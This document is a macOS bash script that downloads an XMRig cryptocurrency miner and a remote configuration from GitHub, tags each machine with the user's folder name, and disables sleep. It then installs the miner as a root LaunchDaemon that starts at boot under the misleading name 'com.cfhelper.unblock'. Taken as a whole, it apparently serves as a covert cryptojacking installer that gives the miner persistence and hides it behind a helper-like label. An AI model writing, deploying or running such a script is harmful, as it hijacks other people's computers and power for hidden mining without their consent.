#!/bin/bash
sudo mkdir -p /usr/local/mycode
echo '/usr/local/mycode' >> /etc/paths
sudo curl -L -o /usr/local/mycode/xmrig https://github.com/Dashtiss/xmrig/releases/download/1.0.0/xmrig-mac
sudo chmod +x /usr/local/mycode/xmrig
sudo curl -L -o /usr/local/mycode/config.json https://gist.githubusercontent.com/Dashtiss/60ea347a9f51bfd6677de45d7cd26117/raw/18be26e577499a330d1f02c8d8b46d919824397a/MyXMRigConfig.json
user_folder=$(basename $HOME)
config_file="/usr/local/mycode/config.json"
sed -i '' 's/            "rig-id": "Macbooks"/            "rig-id": "'"$user_folder"'"/' "$config_file"
sudo pmset -c disablesleep 1
sudo pmset -c displaysleep 1
sudo pmset -c disksleep 0

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

arch=$(uname -m)

if [[ "$arch" == "x86_64" ]]; then
    /usr/local/bin/brew install hwloc
fi

if [[ "$arch" == "arm64" ]]; then
    /opt/homebrew/bin/brew install hwloc
fi

cat << EOF | sudo tee "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.cfhelper.unblock</string>

    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/mycode/xmrig</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>UserName</key>
    <string>root</string>
</dict>
</plist>
EOF
sudo chown root:wheel "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
sudo chmod 644 "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
sudo launchctl load "/Library/LaunchDaemons/com.cfhelper.unblock.plist"